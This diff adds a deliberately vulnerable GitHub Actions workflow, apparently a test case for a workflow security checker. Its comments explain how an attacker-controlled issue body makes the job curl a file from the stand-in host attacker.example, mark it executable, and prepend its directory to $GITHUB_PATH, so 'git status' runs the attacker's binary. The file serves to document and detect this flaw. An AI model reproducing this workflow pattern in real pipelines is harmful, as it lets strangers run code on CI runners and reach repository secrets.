@@ -1,0 +1,28 @@
+# situation: on issues opened, a step downloads the file the issue's body
+#   links to /tmp/t/git, makes it executable, and writes the body to
+#   $GITHUB_PATH; the next step runs git status.
+# reason: the runner adds each line written to $GITHUB_PATH to the front of
+#   PATH for the steps after it, so a body with the line /tmp/t puts that
+#   directory first, and git status runs the attacker's /tmp/t/git instead
+#   of the system's git.
+# attack-value: github.event.issue.body = "https://attacker.example/git\n/tmp/t\n/tmp/PWNED"
+# attack-run-behavior: BODY holds three lines; mkdir makes /tmp/t, curl
+#   saves the file at https://attacker.example/git as /tmp/t/git, chmod
+#   makes it executable, and echo writes the lines
+#   https://attacker.example/git, /tmp/t and /tmp/PWNED to $GITHUB_PATH. The
+#   next step's PATH starts with /tmp/PWNED and /tmp/t (the line written
+#   last comes first), then the line of the URL, and git status runs
+#   /tmp/t/git, the attacker's file.
+on:
+  issues:
+    types: [opened]
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - env:
+          BODY: ${{ github.event.issue.body }}
+        run: |
+          mkdir -p /tmp/t && curl -sLo /tmp/t/git "$(echo "$BODY" | grep -o 'https://[^ ]*' | head -n1)" && chmod +x /tmp/t/git
+          echo "$BODY" >> "$GITHUB_PATH"
+      - run: git status
